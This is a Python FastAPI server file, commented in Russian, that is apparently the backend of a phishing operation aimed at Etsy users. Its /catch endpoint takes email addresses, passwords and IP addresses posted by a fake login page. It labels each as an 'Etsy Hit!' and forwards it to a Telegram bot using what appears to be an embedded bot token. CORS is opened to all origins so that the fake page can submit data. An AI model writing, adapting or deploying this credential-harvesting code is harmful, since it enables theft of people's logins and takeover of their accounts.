from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
import httpx
import os

app = FastAPI()

# Разрешаем запросы с любого домена (чтобы фейк мог слать данные)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.post("/catch")
async def catch_log(request: Request):
    try:
        data = await request.json()
        email = data.get("email", "Нет данных")
        password = data.get("password", "Нет данных")
        ip = request.client.host if request.client else "Нет данных"
        
        text = (
            f"🎯 [+] Etsy Hit!\n"
            f"Email: {email}\n"
            f"Pass: {password}\n"
            f"IP: {ip}"
        )
        
        # Отправляем в Telegram
        async with httpx.AsyncClient() as client:
            url = f"https://api.telegram.org/bot{os.getenv('8817502459:AAG7JDqCXKJNDaIFieOJ_1jkqI2ml6Ssq0E')}/sendMessage"
            await client.post(url, json={"chat_id": os.getenv('8817502459'), "text": text})
            
        return {"status": "success"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.get("/")
def read_root():
    return {"status": "online", "msg": "Catcher is running"}
